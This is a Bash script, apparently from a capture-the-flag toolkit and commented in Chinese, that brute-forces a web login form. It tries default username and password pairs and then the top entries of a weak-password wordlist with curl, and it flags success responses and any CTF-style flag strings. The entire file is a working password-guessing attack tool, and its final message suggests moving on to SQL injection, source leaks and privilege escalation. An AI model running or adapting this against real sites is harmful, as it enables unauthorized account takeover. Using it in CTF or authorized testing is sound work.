#!/bin/bash
# brute-login.sh —— 用容器自带弱口令词典快速爆破登录表单
set -uo pipefail
URL="${1:-}"
UF="${2:-username}"
PF="${3:-password}"
[ -n "$URL" ] || { echo "用法: brute-login.sh <url> [user_field] [pass_field]"; exit 2; }

WL_DIR=/opt/pi-ctf/tools/wordlists/弱口令
WL="${WL:-}"
if [ -z "$WL" ]; then
  for f in "$WL_DIR/admin_weak_passwords.txt" "$WL_DIR/password3000.txt" "$WL_DIR/user500.txt"; do
    if [ -f "$f" ]; then WL="$f"; break; fi
  done
fi
[ -n "$WL" ] || { echo "没找到词典"; exit 3; }
echo "词典: $WL ($(wc -l < "$WL" 2>/dev/null) 行)"

FLAGRE="(flag|FLAG|ctf|CTF|key|KEY|sec|SEC)\{[A-Za-z0-9_+=/.-]{4,200}\}"

probe() {
  local u="$1" p="$2"
  local out code
  out=$(curl -sS -m 5 -w "\n__CODE__%{http_code}" -X POST \
        --data-urlencode "$UF=$u" --data-urlencode "$PF=$p" "$URL" 2>/dev/null)
  code="${out##*__CODE__}"
  body="${out%__CODE__*}"
  # 只认 200/302（登录成功通常跳转）；401/403/404/000 都不算
  case "$code" in
    200|302|303)
      local hit
      hit=$(printf "%s" "$body" | grep -oE "$FLAGRE" 2>/dev/null | head -1)
      echo "MAYBE [$code] $u / $p ${hit:+FLAG=$hit}"
      ;;
  esac
}
export -f probe
export UF PF URL FLAGRE

echo "=== 1) 常见组合"
for pair in "admin:admin" "admin:123456" "admin:password" "admin:admin123" "admin1:admin1" "test:test" "root:root" "guest:guest" "ctf:ctf"; do
  probe "${pair%%:*}" "${pair##*:}"
done

echo "=== 2) 词典前 60 条"
head -60 "$WL" 2>/dev/null | tr -d "\r" | while IFS= read -r pw; do
  [ -z "$pw" ] && continue
  case "$pw" in
    *:*) probe "${pw%%:*}" "${pw##*:}" ;;
    *)   probe admin "$pw" ;;
  esac
done
echo "=== 完成（无 MAYBE 就换攻击面：SQLi / 源码泄露 / 注册处提权 / 目录扫描）"